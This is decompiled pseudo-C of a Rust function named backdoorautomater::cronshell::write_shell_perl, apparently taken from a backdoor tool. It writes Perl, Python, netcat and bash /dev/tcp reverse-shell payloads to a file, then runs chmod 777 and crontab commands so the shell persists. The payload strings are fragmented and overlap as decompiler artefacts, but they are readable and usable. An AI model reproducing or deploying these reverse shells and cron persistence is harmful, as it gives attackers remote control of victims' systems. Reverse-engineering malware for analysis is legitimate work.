long long backdoorautomater::cronshell::write_shell_perl(struct_0 *a0, struct_0 *a1, struct_0 *a2)
{
    unsigned int v0;  // [bp-0x1ec]
    int v1;  // [bp-0x1e8]
    unsigned long long v2;  // [bp-0x1e0]
    unsigned long long v3;  // [bp-0x1d8]
    int v4;  // [bp-0x1c8]
    unsigned long long v5;  // [bp-0x1c0]
    unsigned long long v6;  // [bp-0x1b8]
    int v7;  // [bp-0x1a8], Other Possible Types: char
    unsigned long long v8;  // [bp-0x198]
    int v9;  // [bp-0x168]
    unsigned long long v10;  // [bp-0x158]
    char v11;  // [bp-0x148]
    unsigned long long v12;  // [bp-0x138]
    char v13;  // [bp-0x130], Other Possible Types: unsigned long
    unsigned int v14;  // [bp-0x12c]
    void* v15;  // [bp-0x128], Other Possible Types: unsigned long long
    int v16;  // [bp-0x120]
    char v17;  // [bp-0x60]
    unsigned long long v18;  // [bp-0x40]
    char v19;  // [bp-0x38]
    void* v21;  // r12
    int v22;  // xmm0
    int v23;  // xmm0
    int v24;  // xmm0

    v13.create(a2);
    if (*((int *)&v13))
    {
        v21 = v15;
    }
    else
    {
        v0 = v14;
        v21 = v0.write_all("use Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"RE", 12);
        if (!v21)
        {
            v22 = *((int128_t *)&(&a1->padding_0)[1]);
            v13 = "$i='kindNoneSomeZeroIpv4Ipv6info";
            v15 = 4;
            v16 = v22;
            alloc::str::join_generic_copy(&v7, &v13, 2, 1, 0);
            v3 = v8;
            v1 = v7;
            (char)v1.extend_from_slice("';\nimport socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\nv_ip='os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value])", 3);
            v21 = v0.write_all(v2, v3);
            if (!v21)
            {
                v23 = *((int128_t *)&(&a0->padding_0)[1]);
                v13 = "$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/b";
                v15 = 3;
                v16 = v23;
                alloc::str::join_generic_copy(&v7, &v13, 2, 1, 0);
                v6 = v8;
                v4 = v7;
                (char)v4.extend_from_slice(";\nuse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"", 2);
                v21 = v0.write_all(v5, v6);
                if (!v21)
                {
                    v21 = v0.write_all("socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/", 53);
                    if (!v21)
                    {
                        v21 = v0.write_all("if(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &", 46);
                        if (!v21)
                        {
                            v21 = v0.write_all("open(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/", 19);
                            if (!v21)
                            {
                                v21 = v0.write_all("open(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 20);
                                if (!v21)
                                {
                                    v21 = v0.write_all("open(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 20);
                                    if (!v21)
                                    {
                                        v21 = v0.write_all("exec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 26);
                                        if (!v21)
                                        {
                                            v21 = v0.write_all("};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nREMOTE_IP=\"REMOTE_PORT=/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n/bin/bash -c \'bash -i >& /dev/tcp// 0>&1\' 2>/dev/null &\n", 3);
                                            if (!v21)
                                            {
                                                v24 = *((int128_t *)&(&a2->padding_0)[1]);
                                                v13 = "chmod 777 ;\nuse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,\'>&S\');\nopen(STDOUT,\'>&S\');\nopen(STDERR,\'>&S\');\nexec(\'/usr/bin/bash -i\');\n};\n\"\n\n\nls /bin/ncls /bin/usr/nc#!/bin/bash\n\nR";
                                                v15 = 10;
                                                v16 = v24;
                                                alloc::str::join_generic_copy(&v7, &v13, 2, 1, 0);
                                                v10 = v8;
                                                v9 = v7;
                                                v13.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
                                                v8 = v10;
                                                v7 = v9;
                                                v7.output(v13.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg(&v7));
                                                v17.expect(&v7, &g_62a980);
                                                ::0x461180::core::ptr::drop_in_place<std::process::Command>(&v13);
                                                v7.from_utf8_lossy(v18, *((long long *)&v19));
                                                v13.to_vec(v7.deref(), a2);
                                                v12 = (long long)v16;
                                                memcpy(&v11, &v13, 16);
                                                ::0x461220::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v7);
                                                backdoorautomater::sanitizer::sanitize_system_command(&v11);
                                                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                                ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v17);
                                                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v4);
                                                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v1);
                                                ::0x461110::core::ptr::drop_in_place<std::fs::File>(v0);
                                                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a2);
                                                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a1);
                                                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a0);
                                                return 0;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v4);
            }
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&(char)v1);
        }
        ::0x461110::core::ptr::drop_in_place<std::fs::File>(v0);
    }
    ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a2);
    ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a1);
    ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a0);
    return v21;
}
